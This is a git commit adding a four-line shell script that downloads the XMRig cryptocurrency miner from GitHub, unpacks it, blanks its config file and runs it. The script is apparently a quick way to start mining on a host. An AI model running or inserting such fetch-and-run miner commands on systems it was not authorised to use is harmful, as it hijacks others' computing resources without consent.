01cfe64d733b3932f819bb35925be60880fe594c
Handerfall <64298821+Handerfall@users.noreply.github.com>
2021-02-28 23:15:58 +0200

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-x64.tar.gz
+tar -xvf xmrig-6.9.0-linux-x64.tar.gz
+echo "" > xmrig-6.9.0/config.json
+xmrig-6.9.0/xmrig
